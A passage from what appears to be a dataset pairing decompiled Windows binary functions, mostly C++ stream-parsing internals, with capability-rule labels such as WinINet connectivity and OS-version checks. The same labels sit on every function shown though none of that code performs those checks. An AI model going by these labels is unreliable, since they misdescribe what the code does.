*puVar1;\n            uVar17 = uStack160 >> 1;\n            if (uVar24 < uVar17) {\n                if (uVar17 + uVar24 != puVar1[1]) goto code_r0x0001400392ed;\n            }\n            else {\n                uVar12 = 0xffffffff;\n                if (uVar24 - uVar17 != puVar1[1]) goto code_r0x000140038ee5;\n                *puVar1 = uVar24 - uVar17;\n                *puVar14 = puVar14[1];\n                uVar24 = *puVar1;\n            }\n        }\n        else {\n            if (uVar24 != 1) goto code_r0x0001400392ed;\n            uVar24 = *puVar1;\n        }\n        iVar15 = *(noname_5 + uVar24 * 8);\n        uVar12 = *var_58h;\n        if (uVar12 <= var_68h) goto code_r0x0001400392e0;\n        if (piVar23 == NULL) {\n            bVar27 = true;\n            goto code_r0x000140039587;\n        }\n        goto code_r0x000140039565;\n    }\n    uVar12 = *var_58h;\n    if (1 < uVar24) {\n        puVar14 = puStack152;\n        do {\n            if (*puVar14 < uVar12) {\n                uVar12 = *puVar14;\n            }\n            puVar14 = puVar14 + 1;\n        } while (var_58h + iStack120 != puVar14);\n    }\n    if (uVar12 <= var_68h) goto code_r0x000140039290;\n    if (piVar23 != NULL) {\n        piVar13 = piVar23[2];\n        if (piVar13 < piVar23[3]) {\ncode_r0x0001400390bc:\n            iVar7 = *piVar13;\n        }\n        else {\ncode_r0x0001400394f6:\n            pcVar5 = *(*piVar23 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140039500;\n            iVar7 = (*pcVar5)(piVar23);\n        }\n        bVar27 = iVar7 == -1;\n        if (bVar27) {\n            piVar23 = NULL;\n        }\n    }\n    uVar20 = piStack136 != NULL & uStack121;\n    uVar19 = uStack121;\n    if (uVar20 != 0) {\n        if (piStack136[2] < piStack136[3]) {\n            iVar7 = *piStack136[2];\n        }\n        else {\n            pcVar5 = *(*piStack136 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x14003971b;\n            iVar7 = (*pcVar5)();\n        }\n        if (iVar7 != -1) {\n            uVar20 = 0;\n        }\n        piVar16 = NULL;\n        if (iVar7 != -1) {\n            piVar16 = piStack136;\n        }\n        piStack136 = piVar16;\n        uVar19 = uVar20;\n    }\n    if (bVar27 == uVar19) goto code_r0x000140039290;\n    if (piVar23 == NULL) {\n        iVar15 = *piVar10;\n    }\n    else {\n        if (piVar23[2] < piVar23[3]) {\n            iVar7 = *piVar23[2];\n        }\n        else {\n            pcVar5 = *(*piVar23 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140039739;\n            iVar7 = (*pcVar5)(piVar23);\n        }\n        iVar15 = *piVar10;\n        pcVar5 = *(iVar15 + 0x40);\n        if (iVar7 != -1) {\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140039122;\n            uVar8 = (*pcVar5)(piVar10);\n            var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n            if (piVar23[2] < piVar23[3]) {\n                iVar7 = *piVar23[2];\n            }\n            else {\n                pcVar5 = *(*piVar23 + 0x48);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x14003972a;\n                iVar7 = (*pcVar5)(piVar23);\n            }\n            if (iVar7 == -1) {\n                iVar7 = -1;\n                piVar23 = NULL;\n            }\n            pcVar5 = *(*piVar10 + 0x30);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x14003915a;\n            uVar8 = (*pcVar5)(piVar10, iVar7);\n            goto joined_r0x00014003915f;\n        }\n    }\n    piVar23 = NULL;\n    pcVar5 = *(iVar15 + 0x40);\n    *(&stack0xffffffffffffff20 + iVar11) = 0x140039229;\n    uVar8 = (*pcVar5)(piVar10, 0xffff);\n    var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n    pcVar5 = *(*piVar10 + 0x30);\n    *(&stack0xffffffffffffff20 + iVar11) = 0x14003923b;\n    uVar8 = (*pcVar5)(piVar10, 0xffff);\njoined_r0x00014003915f:\n    if (uVar24 == 0) {\n        uVar12 = 0xffffffff;\n        goto code_r0x000140038ee5;\n    }\n    piStack144 = piVar23;\n    uVar12 = 0;\n    var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n    var_48h = var_68h * 2;\n    do {\n        while( true ) {\n            uVar2 = *(var_48h + *(noname_5 + puVar1[uVar12] * 8));\n            pcVar5 = *(*piVar10 + 0x40);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x1400391e5;\n            iVar7 = (*pcVar5)(piVar10, uVar2);\n            if (iVar7 != var_50h_2) break;\ncode_r0x0001400391eb:\n            uVar12 = uVar12 + 1;\n            if (uVar24 <= uVar12) goto code_r0x0001400391f4;\n        }\n        pcVar5 = *(*piVar10 + 0x30);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x14003918d;\n        iVar7 = (*pcVar5)(piVar10);\n        if (var_60h == iVar7) goto code_r0x0001400391eb;\n        uVar24 = uVar24 - 1;\n        iStack120 = uVar24 * 8;\n        puVar1[uVar12] = puVar1[uVar24];\n        var_58h[uVar12] = var_58h[uVar24];\n    } while (uVar12 < uVar24);\ncode_r0x0001400391f4:\n    piVar23 = piStack144;\n    if (uVar24 < 2) goto code_r0x000140039290;\n    uVar12 = *var_58h;\n    goto code_r0x000140039050;\n}\n",
        "token_count": 7458
    },
    "14003c01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14003c010(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, int32_t *noname_4, int64_t noname_5, \n                  int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint64_t uVar16;\n    int64_t iVar17;\n    uint64_t *puVar18;\n    bool bVar19;\n    int64_t *piVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    uint16_t uVar23;\n    uint64_t uVar24;\n    ulong var_8h_2;\n    int32_t iVar25;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t *piStack112;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar10 = arg3[1];\n    piStack88 = *arg4;\n    piVar20 = arg4[1];\n    piVar22 = *arg3;\n    uVar24 = piVar10 & 0xffffffff;\n    piVar13 = noname_7 + 0xd0;\n    uStack160 = 0x14003c05d;\n    piStack96 = piVar10;\n    piStack80 = piStack88;\n    piVar8 = fcn.1400b9850(piVar13);\n    uStack160 = 0x14003c078;\n    iVar9 = fcn.1400147b0(piVar13);\n    piVar21 = piStack96;\n    iVar9 = -iVar9;\n    puVar14 = &stack0xffffffffffffff68 + iVar9;\n    piStack88._0_1_ = piStack96 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar9;\n    bVar15 = piVar22 != NULL && piStack88;\n    piVar11 = piStack80;\n    bVar19 = bVar15;\n    if (bVar15) {\n        if (piVar22[2] < piVar22[3]) {\n            iVar7 = *piVar22[2];\n        }\n        else {\n            piStack96 = piStack80;\n            piStack80 = piVar21;\n            pcVar3 = *(*piVar22 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar9) = 0x14003c52d;\n            piVar13 = piVar22;\n            iVar7 = (*pcVar3)();\n            piVar11 = piStack96;\n            piVar21 = piStack80;\n        }\n        piStack88._0_1_ = false;\n        if (iVar7 == -1) {\n            piVar22 = NULL;\n            bVar19 = false;\n            piStack88._0_1_ = bVar15;\n        }\n    }\n    piStack96._0_1_ = piVar20 == -1;\n    bVar12 = piVar11 != NULL && piStack96;\n    bVar15 = piStack96;\n    if (bVar12) {\n        if (piVar11[2] < piVar11[3]) {\n            iVar7 = *piVar11[2];\n        }\n        else {\n            piStack104 = piVar21;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack88 = piStack88 & 0xffffffffffffff00 | piStack88;\n            piStack80 = piVar11;\n            pcVar3 = *(*piVar11 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar9) = 0x14003c505;\n            iVar7 = (*pcVar3)();\n            piVar13 = piVar11;\n            piVar11 = piStack80;\n            piVar21 = piStack104;\n        }\n        piStack88 = NULL;\n        if (iVar7 != -1) {\n            piStack88 = piVar11;\n        }\n        bVar15 = iVar7 == -1 && bVar12;\n    }\n    if (bVar15 != piStack88) {\n        iVar7 = uVar24;\n        if (bVar19) {\n            if (piVar22[2] < piVar22[3]) {\n                iVar7 = *piVar22[2];\n            }\n            else {\n                piStack96 = piVar21;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar9) = 0x14003c54c;\n                piVar13 = piVar22;\n                iVar7 = (*pcVar3)();\n                piVar21 = piStack96;\n                piStack96._0_1_ = piStack80;\n            }\n            if (iVar7 == -1) {\n                piVar22 = NULL;\n            }\n        }\n        noname_6 = noname_6 * 2;\n        if (noname_6 != 0) {\n            piVar20 = NULL;\n            piStack80 = piStack80 & 0xffffffffffff0000 | piVar10 & 0xffff;\n            iVar17 = 0;\n            piStack104 = piVar22;\n            piStack96 = piStack96 & 0xffffffffffffff00 | piStack96;\n            piStack112 = piVar21;\ncode_r0x00014003c351:\n            do {\n                if (**(noname_5 + iVar17 * 8) != iVar7) {\n                    pcVar3 = *(*piVar8 + 0x30);\n                    *(&stack0xffffffffffffff60 + iVar9) = 0x14003c342;\n                    piVar13 = piVar8;\n                    iVar5 = (*pcVar3)();\n                    if (iVar5 != iVar7) {\n                        iVar17 = iVar17 + 1;\n                        if (iVar17 == noname_6) break;\n                        goto code_r0x00014003c351;\n                    }\n                }\n                piVar1[piVar20] = iVar17;\n                iVar17 = iVar17 + 1;\n                piVar20 = piVar20 + 1;\n            } while (iVar17 != noname_6);\n            piVar22 = piStack104;\n            uVar24 = piStack80 & 0xffff;\n            piVar21 = piStack112;\n            if (piVar20 != NULL) {\n                if (piStack104[2] < piStack104[3]) {\n                    piStack104[2] = piStack104[2] + 2;\n                    piVar10 = piStack112;\n                }\n                else {\n                    iVar17 = *piStack104;\n                    piStack104 = piStack112;\n                    piStack80 = piVar20;\n                    pcVar3 = *(iVar17 + 0x50);\n                    *(&stack0xffffffffffffff60 + iVar9) = 0x14003c56f;\n                    piVar13 = piVar22;\n                    (*pcVar3)();\n                    piVar20 = piStack80;\n                    piVar10 = piStack104;\n                }\n                *(&stack0xffffffffffffff60 + iVar9) = 0x14003c3b7;\n                iVar17 = fcn.1400147b0(piVar13);\n                piVar13 = NULL;\n                iVar17 = -iVar17;\n                puVar14 = &stack0xffffffffffffff68 + iVar17 + iVar9;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                piStack96 = piVar10;\n                puVar18 = &stack0xffffffffffffff88 + iVar17 + iVar9;\n                do {\n                    uVar4 = *(noname_5 + piVar1[piVar13] * 8);\n                    *(&stack0xffffffffffffff60 + iVar17 + iVar9) = 0x14003c3dd;\n                    uVar24 = sub.msvcrt.dll_wcslen(uVar4);\n                    puVar18[piVar13] = uVar24;\n                    piVar13 = piVar13 + 1;\n                } while (piVar20 != piVar13);\n                uVar24 = 0xffffffff;\n                uVar16 = 1;\n                piStack96._0_1_ = piStack80;\n                goto code_r0x00014003c0c8;\n            }\n        }\n    }\n    piStack96 = piVar21;\n    piVar13 = NULL;\n    uVar16 = 0;\n    puVar18 = NULL;\ncode_r0x00014003c0c8:\n    do {\n        uVar23 = uVar24;\n        piStack104._0_1_ = uVar23 == 0xffff;\n        bVar19 = piVar22 != NULL && piStack104;\n        piStack80._0_1_ = piStack104;\n        if (bVar19) {\n            if (piVar22[2] < piVar22[3]) {\n                iVar7 = *piVar22[2];\n                piStack80._0_1_ = bVar19;\n            }\n            else {\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack96;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | bVar19;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(puVar14 + -8) = 0x14003c4bd;\n                iVar7 = (*pcVar3)(piVar22);\n                piStack96._0_1_ = piStack112;\n            }\n            if (iVar7 == -1) {\n                piVar22 = NULL;\n            }\n            else {\n                piStack80._0_1_ = 0;\n            }\n        }\n        piStack112._0_1_ = piStack88 != NULL & piStack96;\n        if (piStack112 == 0) {\n            if (piStack80 == piStack96) break;\n        }\n        else {\n            if (piStack88[2] < piStack88[3]) {\n                iVar7 = *piStack88[2];\n            }\n            else {\n                uStack120._7_1_ = piStack96;\n                piStack112 = piStack112 & 0xffffffffffffff00 | piStack112;\n                piStack104 = piStack104 & 0xffffffffffffff00 | piStack104;\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack80;\n                pcVar3 = *(*piStack88 + 0x48);\n                *(puVar14 + -8) = 0x14003c48f;\n                iVar7 = (*pcVar3)();\n                piStack96._0_1_ = uStack120._7_1_;\n            }\n            if (iVar7 != -1) {\n                piStack112._0_1_ = 0;\n            }\n            piVar10 = NULL;\n            if (iVar7 != -1) {\n                piVar10 = piStack88;\n            }\n            piStack88 = piVar10;\n            if (piStack80 == piStack112) break;\n        }\n        uVar6 = uVar23;\n        if ((piVar22 != NULL) && (piStack104 != 0)) {\n            if (piVar22[2] < piVar22[3]) {\n                uVar6 = *piVar22[2];\n            }\n            else {\n                piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n                pcVar3 = *(*piVar22 + 0x48);\n                *(puVar14 + -8) = 0x14003c469;\n                uVar6 = (*pcVar3)(piVar22);\n                piStack96._0_1_ = piStack80;\n            }\n            if (uVar6 == 0xffff) {\n                piVar22 = NULL;\n            }\n        }\n        if (piVar13 == NULL) goto code_r0x00014003c2a4;\n        piStack80 = piStack80 & 0xffffffffffff0000 | uVar24 & 0xffff;\n        piVar10 = NULL;\n        piVar20 = NULL;\ncode_r0x00014003c145:\n        do {\n            if (uVar16 < puVar18[piVar10]) {\n                if (*(*(noname_5 + piVar1[piVar10] * 8) + uVar16 * 2) != uVar6) {\n                    piVar13 = piVar13 + -1;\n                    piVar1[piVar10] = piVar1[piVar13];\n                    puVar18[piVar10] = puVar18[piVar13];\n                    if (piVar13 <= piVar10) break;\n                    goto code_r0x00014003c145;\n                }\n            }\n            else {\n                piVar20 = piVar20 + 1;\n            }\n            piVar10 = piVar10 + 1;\n        } while (piVar10 < piVar13);\n        uVar23 = piStack80;\n        if (piVar13 == piVar20) break;\n        if (piVar22[2] < piVar22[3]) {\n            piVar22[2] = piVar22[2] + 2;\n        }\n        else {\n            piStack80 = piStack80 & 0xffffffffffffff00 | piStack96;\n            pcVar3 = *(*piVar22 + 0x50);\n            *(puVar14 + -8) = 0x14003c2de;\n            (*pcVar3)(piVar22);\n            piStack96._0_1_ = piStack80;\n        }\n        uVar16 = uVar16 + 1;\n        uVar24 = 0xffffffff;\n    } while( true );\n    if (piVar13 == 0x1) {\n        uVar24 = *puVar18;\njoined_r0x00014003c2eb:\n        if (uVar24 != uVar16) {\ncode_r0x00014003c2a4:\n            *var_bp_50h = *var_bp_50h | 4;\n            goto code_r0x00014003c2ae;\n        }\n    }\n    else {\n        if (piVar13 != 0x2) goto code_r0x00014003c2a4;\n        if (*puVar18 != uVar16) {\n            uVar24 = puVar18[1];\n            goto joined_r0x00014003c2eb;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar25 <= iVar2) {\n        iVar2 = iVar2 - iVar25;\n    }\n    *noname_4 = iVar2;\ncode_r0x00014003c2ae:\n    *arg1 = piVar22;\n    arg1[1] = piStack96 & 0xffffffffffff0000 | uVar23;\n    return;\n}\n",
        "token_count": 3591
    },
    "14003d6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014003de05)\n// WARNING: Removing unreachable block (ram,0x00014003e237)\n// WARNING: Removing unreachable block (ram,0x00014003e244)\n// WARNING: Removing unreachable block (ram,0x00014003d90e)\n// WARNING: Removing unreachable block (ram,0x00014003d917)\n// WARNING: Removing unreachable block (ram,0x00014003e1a8)\n// WARNING: Removing unreachable block (ram,0x00014003e741)\n// WARNING: Removing unreachable block (ram,0x00014003e74f)\n// WARNING: Removing unreachable block (ram,0x00014003e753)\n// WARNING: Removing unreachable block (ram,0x00014003e1b6)\n// WARNING: Removing unreachable block (ram,0x00014003e1c3)\n// WARNING: Removing unreachable block (ram,0x00014003d928)\n// WARNING: Removing unreachable block (ram,0x00014003d932)\n// WARNING: Removing unreachable block (ram,0x00014003d940)\n// WARNING: Removing unreachable block (ram,0x00014003e200)\n// WARNING: Removing unreachable block (ram,0x00014003d948)\n// WARNING: Removing unreachable block (ram,0x00014003d8b6)\n// WARNING: Removing unreachable block (ram,0x00014003d8c4)\n// WARNING: Removing unreachable block (ram,0x00014003dfe8)\n// WARNING: Removing unreachable block (ram,0x00014003d8c8)\n// WARNING: Removing unreachable block (ram,0x00014003d8d0)\n// WARNING: Removing unreachable block (ram,0x00014003e190)\n// WARNING: Removing unreachable block (ram,0x00014003e71f)\n// WARNING: Removing unreachable block (ram,0x00014003e730)\n// WARNING: Removing unreachable block (ram,0x00014003e738)\n// WARNING: Removing unreachable block (ram,0x00014003e73c)\n// WARNING: Removing unreachable block (ram,0x00014003e19e)\n// WARNING: Removing unreachable block (ram,0x00014003d8e7)\n// WARNING: Removing unreachable block (ram,0x00014003d8e9)\n// WARNING: Removing unreachable block (ram,0x00014003d8f6)\n// WARNING: Removing unreachable block (ram,0x00014003d8fe)\n// WARNING: Removing unreachable block (ram,0x00014003dfb0)\n// WARNING: Removing unreachable block (ram,0x00014003dfbe)\n// WARNING: Removing unreachable block (ram,0x00014003dfd8)\n// WARNING: Removing unreachable block (ram,0x00014003dfdc)\n// WARNING: Removing unreachable block (ram,0x00014003d900)\n// WARNING: Removing unreachable block (ram,0x00014003e210)\n// WARNING: Removing unreachable block (ram,0x00014003e21e)\n// WARNING: Removing unreachable block (ram,0x00014003e308)\n// WARNING: Removing unreachable block (ram,0x00014003de0c)\n\nint64_t ** fcn.14003d6d0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t arg3_00;\n    int64_t **ppiVar7;\n    uint64_t uVar8;\n    int64_t *arg1_00;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar10 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b97f0(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087c0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iVar12 = *piVar1;\n    if (iVar12 == 0) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        iVar12 = *0x1401105f0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar12 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009fd60(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iVar12 = *piVar1;\n    }\n    uStack128 = 0;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.1400a9080(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a9080(&puStack104, 0x20);\n    uStack140 = *(iVar12 + 0x60);\n    iStack256 = 0;\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003d88b. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010afa0\n            ppiVar7 = (*(*(*(&uStack140 + iStack256) * 4 + 0x14010afa0) + 0x14010afa0))();\n            return ppiVar7;\n        }\n        iVar6 = iStack256;\n        iStack256 = iStack256 + 1;\n    } while (iVar6 + 1 < 4);\n    if ((uStack96 < 2) || (uVar8 = fcn.14002f7b0(&puStack104, 0x30, 0),  uVar8 == 0)) goto code_r0x00014003e22d;\n    if (uVar8 == 0xffffffffffffffff) {\n        uVar8 = uStack96 - 1;\n        if (uStack96 == 0) {\n            *puStack104 = 0;\n            goto code_r0x00014003e22d;\n        }\n        if (uVar8 == 0) goto code_r0x00014003e22d;\n    }\n    uVar11 = uStack96;\n    if (uVar8 < uStack96) {\n        uVar11 = uVar8;\n    }\n    fcn.1400a9130(&puStack104, 0, uVar11);\ncode_r0x00014003e22d:\n    uVar8 = uStack128;\n    if (uStack128 != 0) {\n        uVar11 = uStack128 + 1;\n        if (puStack136 == &uStack120) {\n            uVar9 = 0xf;\n        }\n        else {\n            uVar9 = CONCAT71(Stack119, uStack120);\n        }\n        if (uVar9 < uVar11) {\n            fcn.1400a9390(&puStack136, uStack128, 0, 0);\n        }\n        puStack136[uVar8] = 0;\n        puStack136[uVar8 + 1] = 0;\n        uStack128 = uVar11;\n        cVar5 = fcn.1400b7670(*(iVar12 + 0x10), *(iVar12 + 0x18), &puStack136);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    bVar14 = piVar2 == -1;\n    fcn.1400a78c0(in_stack_00000038, &puStack104);\n    bVar13 = piVar10 != NULL && bVar14;\n    if ((piVar10 != NULL && bVar14) && (bVar14 = false,  piVar10[3] <= piVar10[2])) {\n        iVar6 = (**(*piVar10 + 0x48))(piVar10);\n        if (iVar6 == -1) {\n            piVar10 = NULL;\n        }\n        bVar14 = iVar6 == -1 && bVar13;\n    }\n    bVar13 = piVar3 == -1;\n    if (((piVar4 != NULL) && (bVar13)) && (bVar13 = false,  piVar4[3] <= piVar4[2])) {\n        iVar6 = (**(*piVar4 + 0x48))(piVar4);\n        bVar13 = iVar6 == -1;\n    }\n    if (bVar14 == bVar13) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piVar10;\n    arg1[1] = piVar2;\n    if (puStack104 != auStack88) {\n        fcn.1400bc6c0();\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\n    return arg1;\n}\n",
        "token_count": 2464
    },
    "14003e9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014003f115)\n// WARNING: Removing unreachable block (ram,0x00014003f547)\n// WARNING: Removing unreachable block (ram,0x00014003f554)\n// WARNING: Removing unreachable block (ram,0x00014003ec1e)\n// WARNING: Removing unreachable block (ram,0x00014003ec27)\n// WARNING: Removing unreachable block (ram,0x00014003f4b8)\n// WARNING: Removing unreachable block (ram,0x00014003fa51)\n// WARNING: Removing unreachable block (ram,0x00014003fa5f)\n// WARNING: Removing unreachable block (ram,0x00014003fa63)\n// WARNING: Removing unreachable block (ram,0x00014003f4c6)\n// WARNING: Removing unreachable block (ram,0x00014003f4d3)\n// WARNING: Removing unreachable block (ram,0x00014003ec38)\n// WARNING: Removing unreachable block (ram,0x00014003ec42)\n// WARNING: Removing unreachable block (ram,0x00014003ec50)\n// WARNING: Removing unreachable block (ram,0x00014003f510)\n// WARNING: Removing unreachable block (ram,0x00014003ec58)\n// WARNING: Removing unreachable block (ram,0x00014003ebc6)\n// WARNING: Removing unreachable block (ram,0x00014003ebd4)\n// WARNING: Removing unreachable block (ram,0x00014003f2f8)\n// WARNING: Removing unreachable block (ram,0x00014003ebd8)\n// WARNING: Removing unreachable block (ram,0x00014003ebe0)\n// WARNING: Removing unreachable block (ram,0x00014003f4a0)\n// WARNING: Removing unreachable block (ram,0x00014003fa2f)\n// WARNING: Removing unreachable block (ram,0x00014003fa40)\n// WARNING: Removing unreachable block (ram,0x00014003fa48)\n// WARNING: Removing unreachable block (ram,0x00014003fa4c)\n// WARNING: Removing unreachable block (ram,0x00014003f4ae)\n// WARNING: Removing unreachable block (ram,0x00014003ebf7)\n// WARNING: Removing unreachable block (ram,0x00014003ebf9)\n// WARNING: Removing unreachable block (ram,0x00014003ec06)\n// WARNING: Removing unreachable block (ram,0x00014003ec0e)\n// WARNING: Removing unreachable block (ram,0x00014003f2c0)\n// WARNING: Removing unreachable block (ram,0x00014003f2ce)\n// WARNING: Removing unreachable block (ram,0x00014003f2e8)\n// WARNING: Removing unreachable block (ram,0x00014003f2ec)\n// WARNING: Removing unreachable block (ram,0x00014003ec10)\n// WARNING: Removing unreachable block (ram,0x00014003f520)\n// WARNING: Removing unreachable block (ram,0x00014003f52e)\n// WARNING: Removing unreachable block (ram,0x00014003f618)\n// WARNING: Removing unreachable block (ram,0x00014003f11c)\n\nint64_t ** fcn.14003e9e0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t arg3_00;\n    int64_t **ppiVar7;\n    uint64_t uVar8;\n    int64_t *arg1_00;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack256;\n    uint uStack140;\n    uchar *puStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg3[1];\n    piVar3 = arg4[1];\n    piVar10 = *arg3;\n    piVar4 = *arg4;\n    fcn.1400b97f0(in_stack_00000028 + 0xd0);\n    arg3_00 = fcn.14002c080(0x1401087d0);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3_00 * 8;\n    iVar12 = *piVar1;\n    if (iVar12 == 0) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        iVar12 = *0x140110600;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *arg1_00 = iVar12 + 0x10;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.1400a0590(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3_00);\n        iVar12 = *piVar1;\n    }\n    uStack128 = 0;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.1400a9080(&puStack136, 0x20);\n    }\n    uStack96 = 0;\n    auStack88[0] = 0;\n    puStack104 = auStack88;\n    fcn.1400a9080(&puStack104, 0x20);\n    uStack140 = *(iVar12 + 0x60);\n    iStack256 = 0;\n    do {\n        if (*(&uStack140 + iStack256) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003eb9b. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010af8c\n            ppiVar7 = (*(*(*(&uStack140 + iStack256) * 4 + 0x14010af8c) + 0x14010af8c))();\n            return ppiVar7;\n        }\n        iVar6 = iStack256;\n        iStack256 = 